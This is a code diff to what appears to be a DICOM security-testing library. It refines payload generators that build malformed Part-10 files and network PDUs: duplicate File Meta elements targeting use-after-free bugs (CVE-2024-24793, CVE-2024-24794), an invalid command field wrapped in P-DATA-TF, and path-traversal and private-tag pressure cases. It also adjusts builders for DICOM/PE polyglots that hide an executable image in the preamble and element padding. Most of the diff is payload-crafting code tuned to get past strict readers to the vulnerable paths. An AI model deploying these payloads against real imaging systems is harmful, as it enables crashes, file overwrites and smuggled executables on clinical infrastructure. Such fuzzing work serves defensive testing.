@@ -220,6 +220,86 @@ class AttackResult:
 
 
 # =============================================================================
+# Part-10 file construction
+# =============================================================================
+#
+# PS3.10 §7.1 makes the File Meta Information a precondition, not decoration:
+# a reader that cannot find (0002,0000) Group Length and (0002,0010) Transfer
+# Syntax UID does not know how to decode the Data Set and is entitled to stop
+# at the header. A payload that skips the meta group therefore never reaches
+# the parser it is aimed at, and the run reports a rejection that proves
+# nothing about the bug under test.
+#
+# These build the conformant carrier once so a payload only has to express its
+# own malformation.
+
+PART10_PREAMBLE_LEN = 128
+DICM_PREFIX = b'DICM'
+FILE_META_VERSION = b'\x00\x01'
+IMPLEMENTATION_CLASS_UID = '1.2.3.4.5.6.7.8.9'
+EXPLICIT_VR_LE_UID = '1.2.840.10008.1.2.1'
+
+
+def standard_file_meta(sop_class_uid: str = SECONDARY_CAPTURE_SOP_CLASS_UID,
+                       sop_instance_uid: str = '1.2.3.4.5',
+                       transfer_syntax: str = EXPLICIT_VR_LE_UID
+                       ) -> List[Element]:
+    """The Type 1 File Meta elements PS3.10 §7.1 requires, in tag order.
+
+    Returned as a list rather than a Dataset because several payloads need
+    *duplicate* meta elements, which a tag-keyed container cannot hold.
+    """
+    return [
+        Element(0x0002, 0x0001, 'OB', FILE_META_VERSION),
+        Element(0x0002, 0x0002, 'UI', sop_class_uid),
+        Element(0x0002, 0x0003, 'UI', sop_instance_uid),
+        Element(0x0002, 0x0010, 'UI', transfer_syntax),
+        Element(0x0002, 0x0012, 'UI', IMPLEMENTATION_CLASS_UID),
+    ]
+
+
+def part10_file(meta_elements: List[Element], dataset: bytes = b'',
+                preamble: bytes = b'\x00' * PART10_PREAMBLE_LEN,
+                group_length: Optional[int] = None) -> bytes:
+    """A Part-10 file whose File Meta group is exactly ``meta_elements``.
+
+    Emits the 128-byte preamble, the ``DICM`` prefix, a correct (0002,0000)
+    Group Length over the encoded group, then the Data Set. The File Meta
+    group is always Explicit VR Little Endian regardless of what
+    (0002,0010) declares for the Data Set, per PS3.10 §7.1.
+
+    Unlike :class:`DicomFile`'s builder this does not deduplicate by tag,
+    because several payloads *are* duplicate meta elements — and a group
+    length that spans them is exactly what gets a strict reader far enough to
+    insert the second one. Pass ``group_length`` to state a value other than
+    the truth, for payloads whose malformation is the length itself.
+    """
+    body = b''.join(e.encode(implicit_vr=False, little_endian=True)
+                    for e in meta_elements)
+    declared = len(body) if group_length is None else group_length
+    header = Element(0x0002, 0x0000, 'UL', declared).encode(
+        implicit_vr=False, little_endian=True)
+    return (preamble[:PART10_PREAMBLE_LEN].ljust(PART10_PREAMBLE_LEN, b'\x00')
+            + DICM_PREFIX + header + body + dataset)
+
+
+def minimal_dataset() -> bytes:
+    """A small conformant Secondary Capture Data Set, in ascending tag order.
+
+    Payloads whose malformation lives in the File Meta group still need a Data
+    Set after it: the meta group is a header *for* something, and a reader
+    that clears it with nothing behind it has not exercised the parser.
+    """
+    return b''.join(e.encode(implicit_vr=False, little_endian=True) for e in [
+        Element(0x0008, 0x0016, 'UI', SECONDARY_CAPTURE_SOP_CLASS_UID),
+        Element(0x0008, 0x0018, 'UI', '1.2.3.4.5'),
+        Element(0x0008, 0x0060, 'CS', 'OT'),
+        Element(0x0010, 0x0010, 'PN', 'Doe^John'),
+        Element(0x0010, 0x0020, 'LO', '12345'),
+    ])
+
+
+# =============================================================================
 # Parser Attacks - Target DICOM file/dataset parsers
 # =============================================================================
 
@@ -763,7 +843,8 @@ class ProtocolAttacks:
             payload=payload,
             description=f'PDU declares {size:#x} bytes, only 100 present',
             expected_behavior='Target should detect length mismatch',
-            metadata={'declared_size': size},
+            metadata={'declared_size': size,
+                      'bug_class': 'pdu-length-overdeclared'},
         )
 
     @staticmethod
@@ -1005,7 +1086,8 @@ class ProtocolAttacks:
             payload=payload,
             description=f'PDU length inflated by {inflate_by}',
             expected_behavior='Target should detect length mismatch',
-            metadata={'inflate_by': inflate_by},
+            metadata={'inflate_by': inflate_by,
+                      'bug_class': 'pdu-length-overdeclared'},
         )
 
     @staticmethod
@@ -1060,7 +1142,15 @@ class ProtocolAttacks:
             message_id=1,
         )
         cmd.command_field = 0xDEAD  # Invalid!
-        payload = raw(cmd)
+        # A command set travels inside a P-DATA-TF PDV, the same as its
+        # sibling pdata_without_association. Sent bare, the first byte of tag
+        # (0000,0000) lands where the PDU type belongs, so the peer's DUL
+        # rejects an unrecognised PDU and the command-set parser this payload
+        # is aimed at never runs.
+        pdv = PresentationDataValueItem(
+            context_id=1, is_last=1, is_command=1, data=raw(cmd),
+        )
+        payload = raw(DICOM() / P_DATA_TF(pdv_items=[pdv]))
         return AttackResult(
             name='invalid_command_field',
             category='protocol',
@@ -1335,19 +1425,23 @@ class LogicAttacks:
     
     @staticmethod
     def transfer_syntax_mismatch() -> AttackResult:
-        """File declares one transfer syntax but uses another encoding."""
-        meta = Dataset()
-        meta / Element(0x0002, 0x0010, 'UI', '1.2.840.10008.1.2.1')  # Explicit LE
-        
-        # But encode dataset as implicit VR
-        data_implicit = struct.pack('<HH', 0x0010, 0x0010)  # Tag only
+        """File declares one transfer syntax but uses another encoding.
+
+        The mismatch is the attack, so the File Meta group around it is
+        conformant — Type 1 elements and a correct (0002,0000) Group Length.
+        Without them a reader stops at the header for a reason that has
+        nothing to do with the encoding disagreement under test.
+        """
+        # Declares Explicit VR LE...
+        meta = standard_file_meta(transfer_syntax=EXPLICIT_VR_LE_UID)
+
+        # ...but encodes the Data Set as Implicit VR (tag + 4-byte length, no VR)
+        data_implicit = struct.pack('<HH', 0x0010, 0x0010)
         data_implicit += struct.pack('<I', 8)
         data_implicit += b'Doe^John'
-        
-        file_data = b'\x00' * 128 + b'DICM'
-        file_data += meta.encode()
-        file_data += data_implicit
-        
+
+        file_data = part10_file(meta, dataset=data_implicit)
+
         return AttackResult(
             name='transfer_syntax_mismatch',
             category='logic',
@@ -1699,7 +1793,11 @@ class StorageSCPAbuseAttacks:
         return AttackResult(
             name='storage_private_tag_pressure',
             category='storage_abuse',
-            payload=ds.encode(),
+            # sort_tags because group 0011 sorts before the base object's
+            # (0020,xxxx) elements: appended in insertion order the Data Set
+            # descends, which PS3.5 §7.1 forbids and a strict importer may
+            # reject before it ever feels the private-tag pressure.
+            payload=ds.encode(sort_tags=True),
             description=f'C-STORE object with {count} private data elements',
             expected_behavior='Storage/import path should bound private-tag processing and metadata insertion',
             metadata={
@@ -2189,6 +2287,10 @@ class PathTraversalAttacks:
                 'cve': 'CVE-2022-2119',
                 'cves': ['CVE-2022-2119', 'CVE-2022-2120'],
                 'coverage_scope': 'file-meta-sop-instance-uid',
+                # The group-0002 element inside the Data Set is the attack:
+                # PS3.5 forbids it on the network, and the question is whether
+                # a receiver parses it anyway and names a file from it.
+                'bug_class': 'file-meta-element-in-dataset',
                 'target_field': '(0002,0003) Media Storage SOP Instance UID',
                 'dataset_sop_instance_uid': '1.2.3.4.5',
                 'traversal_payload': value,
@@ -3671,7 +3773,8 @@ class CVEAttacks:
             description='Sequence with undefined length but no items',
             expected_behavior='Parser may access freed sequence memory',
             metadata={'cve': 'CVE-2023-32135',
-                      'bug_class': 'dangling-sequence-reference'}
+                      'bug_class': 'dangling-sequence-reference',
+                      'delivery_hint': 'cstore'}
         ))
         
         # Test 2: Invalid nested dataset pointers (beyond EOF)
@@ -3690,7 +3793,8 @@ class CVEAttacks:
             description='Sequence item with offset beyond EOF',
             expected_behavior='Parser should detect invalid offset',
             metadata={'cve': 'CVE-2023-32135',
-                      'bug_class': 'oob-item-length'}
+                      'bug_class': 'oob-item-length',
+                      'delivery_hint': 'cstore'}
         ))
         
         # Test 3: Premature sequence termination (truncated file)
@@ -3710,7 +3814,8 @@ class CVEAttacks:
             description='Sequence truncated without delimiters',
             expected_behavior='Parser may leave dangling references',
             metadata={'cve': 'CVE-2023-32135',
-                      'bug_class': 'truncated-sequence'}
+                      'bug_class': 'truncated-sequence',
+                      'delivery_hint': 'cstore'}
         ))
         
         return results
@@ -3787,6 +3892,7 @@ class CVEAttacks:
             'delivery': 'raw-pdu',
             'repeat_for_detection': 1000,
             'expected_monitor': 'memory-growth-or-lsan',
+            'bug_class': 'truncated-user-information-item',
         })
         return [AttackResult(
             name='cve_2026_50254_storescp_assoc_leak_truncated_max_length',
@@ -3946,88 +4052,88 @@ class CVEAttacks:
         
         When inserting duplicate tags into File Meta Information header,
         the element is freed but still referenced.
+
+        The duplicate is the attack, so everything around it is conformant:
+        a full Type 1 File Meta group with a (0002,0000) Group Length that
+        spans the duplicate, and a Data Set behind it. Emitting the preamble,
+        ``DICM`` and the bare duplicate left a file with no group length and
+        no Transfer Syntax UID, which ``DcmMetaInfo::read`` rejects at the
+        header — the duplicate-insertion path that holds the use-after-free
+        was never reached, and the run recorded a rejection that said nothing
+        about the bug.
         """
         results = []
-        
+
+        def duplicated(tag_element: int, duplicate: Element, **meta_kw):
+            """Standard meta with ``duplicate`` inserted after its original.
+
+            Placing it immediately after the element it duplicates is what a
+            parser meets in the wild, and keeps the rest of the group in the
+            ascending tag order PS3.5 §7.1 requires.
+            """
+            meta = standard_file_meta(**meta_kw)
+            at = max(i for i, e in enumerate(meta)
+                     if e.tag.element == tag_element) + 1
+            meta.insert(at, duplicate)
+            return part10_file(meta, dataset=minimal_dataset())
+
         # Test 1: Duplicate Transfer Syntax UID
-        meta = b'\x00' * 128 + b'DICM'
-        # First Transfer Syntax
-        meta += struct.pack('<HH', 0x0002, 0x0010)
-        meta += b'UI'
-        meta += struct.pack('<H', 18)
-        meta += b'1.2.840.10008.1.2\x00'
-        # DUPLICATE Transfer Syntax
-        meta += struct.pack('<HH', 0x0002, 0x0010)
-        meta += b'UI'
-        meta += struct.pack('<H', 20)
-        meta += b'1.2.840.10008.1.2.1\x00'
-        
         results.append(AttackResult(
             name='cve_2024_24793_01_duplicate_transfer_syntax',
             category='cve',
-            payload=meta,
+            payload=duplicated(
+                0x0010, Element(0x0002, 0x0010, 'UI', EXPLICIT_VR_LE_UID),
+                transfer_syntax='1.2.840.10008.1.2'),
             description='Two Transfer Syntax UID elements in meta header',
             expected_behavior='Parser may UAF on duplicate insertion',
-            metadata={'cve': 'CVE-2024-24793'}
+            metadata={'cve': 'CVE-2024-24793',
+                      'bug_class': 'duplicate-meta-element'}
         ))
-        
+
         # Test 2: Duplicate Media Storage SOP Class
-        meta = b'\x00' * 128 + b'DICM'
-        meta += struct.pack('<HH', 0x0002, 0x0002)
-        meta += b'UI'
-        meta += struct.pack('<H', 26)
-        meta += b'1.2.840.10008.5.1.4.1.1.2\x00'
-        meta += struct.pack('<HH', 0x0002, 0x0002)  # DUPLICATE
-        meta += b'UI'
-        meta += struct.pack('<H', 26)
-        meta += b'1.2.840.10008.5.1.4.1.1.4\x00'
-        
         results.append(AttackResult(
             name='cve_2024_24793_02_duplicate_sop_class',
             category='cve',
-            payload=meta,
+            payload=duplicated(
+                0x0002, Element(0x0002, 0x0002, 'UI',
+                                '1.2.840.10008.5.1.4.1.1.4'),
+                sop_class_uid='1.2.840.10008.5.1.4.1.1.2'),
             description='Two Media Storage SOP Class elements',
             expected_behavior='Parser may UAF on duplicate',
-            metadata={'cve': 'CVE-2024-24793'}
+            metadata={'cve': 'CVE-2024-24793',
+                      'bug_class': 'duplicate-meta-element'}
         ))
-        
-        # Test 3: Duplicate with different VRs
-        meta = b'\x00' * 128 + b'DICM'
-        meta += struct.pack('<HH', 0x0002, 0x0010)
-        meta += b'UI'
-        meta += struct.pack('<H', 18)
-        meta += b'1.2.840.10008.1.2\x00'
-        meta += struct.pack('<HH', 0x0002, 0x0010)
-        meta += b'LO'  # Different VR!
-        meta += struct.pack('<H', 20)
-        meta += b'1.2.840.10008.1.2.1\x00'
-        
+
+        # Test 3: Duplicate with different VRs. 'LO' rather than 'UI' for the
+        # same tag, so a parser that keys its free on the first VR and its
+        # read on the second disagrees with itself about the value's length.
         results.append(AttackResult(
             name='cve_2024_24793_03_duplicate_different_vr',
             category='cve',
-            payload=meta,
+            payload=duplicated(
+                0x0010, Element(0x0002, 0x0010, 'LO', EXPLICIT_VR_LE_UID),
+                transfer_syntax='1.2.840.10008.1.2'),
             description='Duplicate tag with conflicting VRs',
             expected_behavior='Parser confusion on VR',
-            metadata={'cve': 'CVE-2024-24793'}
+            metadata={'cve': 'CVE-2024-24793',
+                      'bug_class': 'duplicate-meta-element-vr-conflict'}
         ))
-        
+
         # Test 4: Rapid duplicate sequence (many duplicates)
-        meta = b'\x00' * 128 + b'DICM'
-        for i in range(10):
-            meta += struct.pack('<HH', 0x0002, 0x0010)
-            meta += b'UI'
-            meta += struct.pack('<H', 18)
-            meta += b'1.2.840.10008.1.2\x00'
-        
+        meta = standard_file_meta(transfer_syntax='1.2.840.10008.1.2')
+        at = max(i for i, e in enumerate(meta) if e.tag.element == 0x0010) + 1
+        for _ in range(9):
+            meta.insert(at, Element(0x0002, 0x0010, 'UI', '1.2.840.10008.1.2'))
         results.append(AttackResult(
             name='cve_2024_24793_04_rapid_duplicates',
             category='cve',
-            payload=meta,
+            payload=part10_file(meta, dataset=minimal_dataset()),
             description='10 consecutive duplicate Transfer Syntax tags',
             expected_behavior='Multiple UAF opportunities',
-            metadata={'cve': 'CVE-2024-24793'}
+            metadata={'cve': 'CVE-2024-24793',
+                      'bug_class': 'duplicate-meta-element'}
         ))
-        
+
         return results
     
     # -------------------------------------------------------------------------
@@ -4071,7 +4177,8 @@ class CVEAttacks:
             payload=data,
             description='Duplicate tag within sequence item',
             expected_behavior='Parser may UAF in sequence context',
-            metadata={'cve': 'CVE-2024-24794'}
+            metadata={'cve': 'CVE-2024-24794',
+                      'delivery_hint': 'cstore'}
         ))
         
         # Test 2: Duplicate sequence delimiters
@@ -4094,7 +4201,8 @@ class CVEAttacks:
             payload=data,
             description='Multiple sequence delimitation items',
             expected_behavior='Parser may process freed delimiter',
-            metadata={'cve': 'CVE-2024-24794'}
+            metadata={'cve': 'CVE-2024-24794',
+                      'delivery_hint': 'cstore'}
         ))
         
         # Test 3: Deeply nested duplicates (5 levels)
@@ -4129,7 +4237,8 @@ class CVEAttacks:
             payload=data,
             description='5 levels of nesting with duplicates at each',
             expected_behavior='UAF at multiple nesting levels',
-            metadata={'cve': 'CVE-2024-24794'}
+            metadata={'cve': 'CVE-2024-24794',
+                      'delivery_hint': 'cstore'}
         ))
         
         return results
@@ -4246,7 +4355,13 @@ class CVEAttacks:
         """
         creator = CVEAttacks._POLYGLOT_PRIVATE_CREATOR.encode(
             implicit_vr=False, little_endian=True)
-        value_start = (CVEAttacks._polyglot_head_len(creator) +
+        # The carrier goes mid-body, not in front of it: group 0009 sorts
+        # after the (0008,xxxx) identity elements and before the (0010,xxxx)
+        # patient ones, and PS3.5 §7.1 requires ascending tag order. Leading
+        # with it produced a Data Set a strict reader is entitled to reject
+        # before reaching the private element the payload is about.
+        value_start = (CVEAttacks._polyglot_head_len() +
+                       len(CVEAttacks._polyglot_identity()) + len(creator) +
                        CVEAttacks._LONG_FORM_HEADER_LEN)
         pad = -value_start % 4
         pe_offset = value_start + pad
@@ -4256,7 +4371,8 @@ class CVEAttacks:
         carrier = Element(0x0009, 0x1001, 'OB', b'\x00' * pad + image)
         return CVEAttacks._polyglot_part10(
             preamble=dos_header(pe_offset) + stub[:64].ljust(64, b'\x00'),
-            lead=creator + carrier.encode(implicit_vr=False, little_endian=True),
+            insert=creator + carrier.encode(implicit_vr=False,
+                                            little_endian=True),
         )
 
     @staticmethod
@@ -4602,7 +4718,9 @@ class CVEAttacks:
         content = b'VENDORCFG\x00'
         creator = CVEAttacks._POLYGLOT_PRIVATE_CREATOR.encode(
             implicit_vr=False, little_endian=True)
-        value_start = CVEAttacks._polyglot_head_len(creator) + 12
+        value_start = (CVEAttacks._polyglot_head_len() +
+                       len(CVEAttacks._polyglot_identity()) + len(creator) +
+                       CVEAttacks._LONG_FORM_HEADER_LEN)
         pad_start = value_start + len(content)
         pe_offset = pad_start + (-pad_start % 4)
         carrier = Element(
@@ -4614,8 +4732,8 @@ class CVEAttacks:
             category='cve',
             payload=CVEAttacks._polyglot_part10(
                 preamble=dos_header(pe_offset) + b'\x00' * 64,
-                lead=creator + carrier.encode(implicit_vr=False,
-                                              little_endian=True)),
+                insert=creator + carrier.encode(implicit_vr=False,
+                                                little_endian=True)),
             description='PE image hidden in the padding tail of a Data Element '
                         'whose declared length covers it',
             expected_behavior='Scanner should inspect whole element values, not '
